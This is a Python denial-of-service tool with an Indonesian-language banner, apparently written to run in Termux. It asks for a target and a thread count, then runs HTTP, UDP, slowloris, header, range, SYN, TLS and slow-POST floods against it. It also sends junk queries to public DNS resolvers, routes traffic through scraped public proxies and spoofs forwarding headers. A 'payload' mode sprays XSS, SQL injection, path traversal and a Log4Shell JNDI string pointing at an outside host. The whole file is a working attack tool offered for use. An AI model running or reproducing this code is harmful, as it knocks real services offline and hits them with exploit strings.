#tools dedeos simple run termux
import threading
import socket
import requests
import random
import time
import sys
import warnings
import json
import os
import ssl
from urllib.parse import urlparse

warnings.filterwarnings("ignore")

# warna
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
reset = '\033[0m'

maklu = f"""
{R}
╔════════════════════════════════════════════════════════════╗
║  ██████╗ ██████╗  ██████╗ ███████╗                         ║
║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                         ║
║  ██║  ██║██████╔╝██║   ██║███████╗                         ║
║  ██║  ██║██╔══██╗██║   ██║╚════██║                         ║
║  ██████╔╝██║  ██║╚██████╔╝███████║                         ║
║  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                         ║
║                                                             ║
║         DDOS DROSING TOOLS D3N!X             ║
║     {Y}GUNAKAN DENGAN BIJAK{reset}{R}            ║
║     {R}KAMI TIDAK BERTANGGUNG JAWAB!{reset}{R}
╚════════════════════════════════════════════════════════════╝
{reset}
"""

print(maklu)

attack_active = True
request_count = 0
error_count = 0
bandwidth_used = 0
lock = threading.Lock()
bandwidth_lock = threading.Lock()
target = ""
target_host = ""
port = 80
duration = 0
use_proxy = ""
proxies_list = []
proxy_lock = threading.Lock()
log_file = f"ddos_log_{int(time.time())}.txt"

def safe_input(prompt, default=None):
    try:
        user_input = input(prompt)
        if user_input.strip() == "" and default is not None:
            return default
        return user_input.strip()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Exiting...{reset}")
        sys.exit(0)

def safe_int_input(prompt, default=None, min_val=0, max_val=None):
    while True:
        try:
            user_input = safe_input(prompt, str(default) if default else None)
            if not user_input and default is not None:
                return default
            val = int(user_input)
            if min_val is not None and val < min_val:
                print(f"{Y}[!] Minimum {min_val}!{reset}")
                continue
            if max_val is not None and val > max_val:
                print(f"{Y}[!] Maximum {max_val}!{reset}")
                continue
            return val
        except ValueError:
            print(f"{R}[!] Harus angka!{reset}")

def parse_target(target_input):
    target_input = target_input.strip()
    if not target_input.startswith(('http://', 'https://')):
        target_input = 'http://' + target_input
    parsed = urlparse(target_input)
    hostname = parsed.hostname or target_input.split('/')[0]
    return target_input, hostname

target_raw = safe_input(f"{Y}[?]{W} Target URL/IP: ")
target, target_host = parse_target(target_raw)
port = safe_int_input(f"{Y}[?]{W} Port (default 80): ", default=80, min_val=1, max_val=65535)
threads = safe_int_input(f"{Y}[?]{W} Jumlah Thread (1-2000): ", default=100, min_val=1, max_val=2000)
method = safe_input(f"{Y}[?]{W} Method (http/udp/slow/header/range/dns/syn/ssl/post/multi/payload/mix/auto): ").lower()
duration = safe_int_input(f"{Y}[?]{W} Durasi detik (0=unlimited): ", default=0)

use_proxy = safe_input(f"{Y}[?]{W} Pake proxy? (y/n): ").lower()
if use_proxy == 'y':
    print(f"{Y}[!]{W} Fetching proxies...")
    proxy_sources = [
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
    ]
    for source in proxy_sources:
        try:
            response = requests.get(source, timeout=10, verify=False)
            new_proxies = response.text.splitlines()
            proxies_list.extend([p.strip() for p in new_proxies if p.strip()])
            print(f"{G}[+]{W} Loaded {len(new_proxies)} proxies")
        except:
            print(f"{R}[!]{W} Failed: {source[:50]}{reset}")
    proxies_list = list(set(proxies_list))
    print(f"{G}[+]{W} Total unique: {len(proxies_list)}{reset}")

# user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

referers = [
    "https://google.com", "https://facebook.com", "https://youtube.com", 
    "https://instagram.com", "https://twitter.com", "https://tiktok.com",
    "https://whatsapp.com", "https://telegram.org", "https://discord.com"
]

def random_string(length=10):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(length))

def get_random_proxy():
    if proxies_list and use_proxy == 'y':
        with proxy_lock:
            return {"http": random.choice(proxies_list), "https": random.choice(proxies_list)}
    return None

def update_bandwidth(bytes_sent):
    global bandwidth_used
    with bandwidth_lock:
        bandwidth_used += bytes_sent

def get_bandwidth_mb():
    return bandwidth_used / (1024 * 1024)

def save_log(message):
    try:
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
    except:
        pass

#http flood
def http_flood():
    global request_count, error_count
    session = requests.Session()
    session.verify = False
    
    while attack_active:
        try:
            random_path = f"/{random_string()}?{random_string()}={random.randint(1,999999)}&cb={int(time.time()*1000)}"
            full_url = target.rstrip('/') + random_path
            
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": random.choice(referers)
            }
            
            proxy = get_random_proxy()
            
            if random.choice(['get', 'post']) == 'get':
                response = session.get(full_url, headers=headers, proxies=proxy, timeout=5)
            else:
                response = session.post(full_url, headers=headers, data={random_string(): random_string()}, proxies=proxy, timeout=5)
            
            with lock:
                request_count += 1
                print(f"{G}[HTTP]{W} Req #{request_count} - {response.status_code}")
                
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(random.uniform(0.001, 0.005))

#udp ah ah ah
def udp_flood():
    global request_count, error_count
    try:
        ip = socket.gethostbyname(target_host)
    except:
        ip = target_host
    
    data = random._urandom(1490)
    
    while attack_active:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.sendto(data, (ip, port))
            update_bandwidth(len(data))
            sock.close()
            
            with lock:
                request_count += 1
                if request_count % 100 == 0:
                    print(f"{G}[UDP]{W} #{request_count} -> {ip}:{port}")
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(0.0001)
#batas

def slowloris_attack():
    global request_count, error_count
    try:
        ip = socket.gethostbyname(target_host)
    except:
        ip = target_host
    
    sockets_list = []
    for _ in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(f"GET /{random_string()} HTTP/1.1\r\n".encode())
            s.send(f"Host: {ip}\r\n".encode())
            s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            sockets_list.append(s)
        except:
            pass
    
    while attack_active:
        for s in sockets_list[:]:
            try:
                s.send(f"X-{random_string()}: {random_string()}\r\n".encode())
                with lock:
                    request_count += 1
                    if request_count % 50 == 0:
                        print(f"{Y}[SLOW]{W} #{request_count}")
            except:
                sockets_list.remove(s)
                try:
                    s.close()
                except:
                    pass
        time.sleep(15)

def header_flood():
    global request_count, error_count
    session = requests.Session()
    session.verify = False
    
    while attack_active:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Accept-Language": "id-ID,id;q=0.9,en;q=0.8",
                "Cache-Control": "no-cache",
                "X-Custom-Hdr": random_string(500),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": random.choice(referers)
            }
            
            for i in range(10):
                headers[f"X-Random-{i}"] = random_string(200)
            
            proxy = get_random_proxy()
            response = session.get(target, headers=headers, proxies=proxy, timeout=5)
            
            with lock:
                request_count += 1
                print(f"{C}[HDR]{W} #{request_count} - {response.status_code}")
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(random.uniform(0.001, 0.005))

# ==================== RANGE FLOOD ====================
def range_flood():
    global request_count, error_count
    session = requests.Session()
    session.verify = False
    
    while attack_active:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Range": "bytes=0-,0-,0-,0-,0-",
                "Accept-Encoding": "identity",
                "Referer": random.choice(referers)
            }
            
            proxy = get_random_proxy()
            response = session.get(target, headers=headers, proxies=proxy, timeout=5)
            
            with lock:
                request_count += 1
                print(f"{P}[RNG]{W} #{request_count} - {response.status_code}")
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(random.uniform(0.001, 0.005))

dns_servers = [
    "8.8.8.8", "1.1.1.1", "8.8.4.4", "1.0.0.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "64.6.64.6", "84.200.69.80"
]

def dns_amplification():
    global request_count, error_count
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
        
        while attack_active:
            try:
                dns_server = random.choice(dns_servers)
                sock.sendto(query, (dns_server, 53))
                update_bandwidth(len(query))
                
                with lock:
                    request_count += 1
                    if request_count % 50 == 0:
                        print(f"{B}[DNS]{W} Amp #{request_count} -> {dns_server}")
            except:
                with lock:
                    error_count += 1
            finally:
                time.sleep(0.0001)
    except:
        pass

def syn_flood():
    global request_count, error_count
    try:
        ip = socket.gethostbyname(target_host)
        
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((ip, port))
                sock.close()
                
                with lock:
                    request_count += 1
                    if request_count % 100 == 0:
                        print(f"{R}[SYN]{W} #{request_count} -> {ip}:{port}")
            except:
                with lock:
                    error_count += 1
            finally:
                time.sleep(0.00001)
    except:
        pass
#ssl
def ssl_reneg_flood():
    global request_count, error_count
    try:
        ip = socket.gethostbyname(target_host)
        
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                context = ssl.create_default_context()
                ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                ssl_sock.close()
                
                with lock:
                    request_count += 1
                    if request_count % 50 == 0:
                        print(f"{C}[SSL]{W} Reneg #{request_count}")
            except:
                with lock:
                    error_count += 1
            finally:
                time.sleep(0.001)
    except:
        pass

def slow_post_flood():
    global request_count, error_count
    session = requests.Session()
    session.verify = False
    
    while attack_active:
        try:
            data = "a" * 1024
            headers = {
                "User-Agent": random.choice(user_agents),
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(data) * 10)
            }
            
            proxy = get_random_proxy()
            session.post(target, data=data, headers=headers, proxies=proxy, timeout=5)
            
            with lock:
                request_count += 1
                print(f"{Y}[POST]{W} Slow Post #{request_count}")
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(random.uniform(0.5, 1.0))

paths = [
    "/", "/index.php", "/wp-admin", "/login", "/api", "/graphql",
    "/.env", "/config.php", "/backup.zip", "/admin", "/cpanel"
]

def multipath_flood():
    global request_count, error_count
    session = requests.Session()
    session.verify = False
    
    while attack_active:
        try:
            path = random.choice(paths) + "?" + random_string(8) + "=" + random_string(8)
            full_url = target.rstrip('/') + path
            
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Cache-Control": "no-cache",
                "Referer": random.choice(referers)
            }
            
            proxy = get_random_proxy()
            response = session.get(full_url, headers=headers, proxies=proxy, timeout=3)
            
            with lock:
                request_count += 1
                print(f"{P}[MPTH]{W} #{request_count} - {path[:30]} - {response.status_code}")
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(random.uniform(0.001, 0.003))

custom_payloads = [
    "<?php echo 'hacked'; ?>",
    "<script>alert('XSS')</script>",
    "../../../etc/passwd",
    "1' OR '1'='1",
    "${jndi:ldap://maklu.com/a}"
]

def payload_flood():
    global request_count, error_count
    session = requests.Session()
    
    while attack_active:
        try:
            payload = random.choice(custom_payloads)
            data = {"search": payload, "q": payload, "input": payload}
            
            headers = {"User-Agent": random.choice(user_agents)}
            proxy = get_random_proxy()
            
            response = session.post(target, data=data, headers=headers, proxies=proxy, timeout=5)
            
            with lock:
                request_count += 1
                print(f"{R}[PLD]{W} #{request_count} - Payload: {payload[:20]}")
        except:
            with lock:
                error_count += 1
        finally:
            time.sleep(random.uniform(0.01, 0.05))

#sange mix
def mix_flood():
    methods = [http_flood, udp_flood, slowloris_attack, header_flood, range_flood, dns_amplification, multipath_flood]
    while attack_active:
        try:
            m = random.choice(methods)
            m()
            time.sleep(0.01)
        except:
            pass

def auto_switch_flood():
    available_methods = [http_flood, udp_flood, slowloris_attack, header_flood, range_flood, dns_amplification, syn_flood, multipath_flood]
    current_index = 0
    
    print(f"{G}[!] AUTO-SWITCH MODE ACTIVE! akan ganti method setiap 30 detik{reset}")
    
    while attack_active:
        try:
            current_method = available_methods[current_index]
            method_name = current_method.__name__
            
            print(f"{Y}[!] Switching to: {method_name.upper()}{reset}")
            
            start_time = time.time()
            while time.time() - start_time < 30 and attack_active:
                current_method()
                time.sleep(0.01)
            
            current_index = (current_index + 1) % len(available_methods)
        except:
            pass

def auto_save_stats():
    while attack_active:
        time.sleep(30)
        with lock:
            current = request_count
            errors = error_count
        save_log(f"STATS: Requests={current}, Errors={errors}, Bandwidth={get_bandwidth_mb():.2f}MB")

def stats_monitor():
    global attack_active
    
    start_time = time.time()
    last_count = 0
    
    while attack_active:
        time.sleep(5)
        elapsed = int(time.time() - start_time)
        
        with lock:
            current = request_count
            errors = error_count
            rps = (current - last_count) / 5
            last_count = current
        
        print(f"\n{C}{'='*55}{reset}")
        print(f"{Y}📊 STATISTICS:")
        print(f"   Total Request: {G}{current:,}{reset}")
        print(f"   Total Errors:  {R}{errors:,}{reset}")
        print(f"   Rate:          {G}{rps:.1f}{reset} req/s")
        print(f"   Bandwidth:     {G}{get_bandwidth_mb():.2f}{reset} MB")
        print(f"   Duration:      {Y}{elapsed}{reset} s")
        print(f"   Active Threads:{Y}{threading.active_count()}{reset}")
        print(f"   Success Rate:  {G}{(current/(current+errors+0.01))*100:.1f}{reset}%")
        print(f"{C}{'='*55}{reset}\n")
        
        if duration > 0 and elapsed >= duration:
            attack_active = False
            print(f"{R}[!] waktu selesai stopping...{reset}")
            save_log(f"FINISHED: Duration={elapsed}s, Requests={current}, Errors={errors}, Bandwidth={get_bandwidth_mb():.2f}MB")
            break

#main 
print(f"\n{R}[!]{W} TARGET: {target_host}:{port}")
print(f"{R}[!]{W} METHOD: {method.upper()} | THREADS: {threads}")
print(f"{R}[!]{W} PROXY: {'ON' if use_proxy=='y' and proxies_list else 'OFF'}")
print(f"{R}[!]{W} DURATION: {'UNLIMITED' if duration==0 else f'{duration}s'}")
print(f"{R}[!]{W} Pencet Ctrl+C to stop{reset}\n")

#method map
method_map = {
    'http': http_flood,
    'udp': udp_flood,
    'slow': slowloris_attack,
    'header': header_flood,
    'range': range_flood,
    'dns': dns_amplification,
    'syn': syn_flood,
    'ssl': ssl_reneg_flood,
    'post': slow_post_flood,
    'multi': multipath_flood,
    'payload': payload_flood,
    'mix': mix_flood,
    'auto': auto_switch_flood
}

target_func = method_map.get(method, http_flood)

for _ in range(threads):
    t = threading.Thread(target=target_func)
    t.daemon = True
    t.start()

#monitor
monitor_thread = threading.Thread(target=stats_monitor)
monitor_thread.daemon = True
monitor_thread.start()

save_thread = threading.Thread(target=auto_save_stats)
save_thread.daemon = True
save_thread.start()

#end error? fix dewek
try:
    while attack_active:
        time.sleep(1)
except KeyboardInterrupt:
    attack_active = False
    print(f"\n{R}[!] STOPPED BY USER!{reset}")
    print(f"{Y}📊 FINAL: {request_count:,} requests, {error_count:,} errors, {get_bandwidth_mb():.2f}MB used{reset}")
    save_log(f"STOPPED: Requests={request_count}, Errors={error_count}, Bandwidth={get_bandwidth_mb():.2f}MB")
    sys.exit(0)
